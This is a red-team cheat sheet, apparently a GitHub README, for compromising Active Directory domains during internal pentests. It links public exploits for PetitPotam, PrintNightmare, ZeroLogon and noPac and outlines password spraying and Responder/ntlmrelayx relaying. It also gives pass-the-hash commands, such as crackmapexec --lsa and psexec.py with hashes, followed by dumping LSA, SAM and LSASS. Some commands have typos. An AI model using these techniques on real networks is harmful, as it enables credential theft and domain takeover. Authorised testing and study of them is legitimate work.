# JustGetDA
JustGetDA, a cheat sheet which will aid you through internal network &amp; red team engagements.

# AD Mindmap
![](pentest_ad.png)
Credit: mayfly (@M4yFly) & viking (@Vikingfr)

##

# Privilege Escalations

The below privilege escalations are inspired from: https://github.com/cfalta/MicrosoftWontFixList

# Local Privilege Escalation:
- InstallerFileTakeOver: https://github.com/klinix5/InstallerFileTakeOver
- SeriousSAM / HiveNightmare: https://github.com/GossiTheDog/HiveNightmare
- <insert funny name> Potato: https://github.com/d4rckh/WindowsPotatoes

# Domain Privilege Escalation:
- PetitPotam: https://github.com/topotam/PetitPotam
- samAccountName Spoofing: https://github.com/cube0x0/noPac / https://github.com/WazeHell/sam-the-admin
- PrintNightmare: https://github.com/cube0x0/CVE-2021-1675
- ZeroLogon: https://github.com/dirkjanm/
  CVE-2020-1472 / https://github.com/risksense/zerologon / https://github.com/SecuraBV/CVE-2020-1472
- ADCS (Certified Pre-Owned): https://posts.specterops.io/certified-pre-owned-d95910965cd2
- NoPac: https://github.com/cube0x0/noPac

# Misc
KrbRelay: https://github.com/cube0x0/KrbRelay
  
##
  
# My Internal Pentest Methodology 
  
## External Reconnaissance
  A client may allow you onto the internal network on a Kali VM positioned somewhere within their network. Without domain credentials, there is not much one can do so tools like the following are useful to gather usernames/email addresses:
  - Weakest Link (browser extension)
  - hunter.io
  - theHarvester
  - Foca
  
## Spraying
  Once usernames/email addresses are obtained from the above step, one can spray credentials across the network hoping to compromise weak domain credentials using the following tools:
  - SprayingToolkit (atomizer)
  - kerbrute 
  - auxiliary/scanner/smb/smb_login (Metasploit)
  - MailSniper
  
## Internal Reconnaissance
  It is suggested to run tools in the background even if domain credentials are compromised. The more tools running, the better. Reccomended internal reconnaissance tools are as following:
  - Responder (`Responder -I eth0`
  - Responder (using NTLMRelayX - `ntlmrelayx.py -t 10.10.10.10`

## Checking Access
  If credentials are compromised, one can use them to authenticate into a machine using the following commands:
  - `crackmapexec smb 10.10.10.10 -u Administrator -H hashes --lsa
  - `pth-winexe U Administrator%hashes //10.10.10.10 cmd`
  - `psexec.py -hashes :hashes administrator@10.10.10.10 cmd`
  - `xfreerdp u:/administrator /d:test.local /pth:hashes /v:10.10.10.10`
  
 ## Credential Harvesting
  From here one can dump LSA / SAM / LSASS / etc. Hopefully from there a DA account is discovered and the domain is pwned.

< Adding more fine grained methods soon >
 
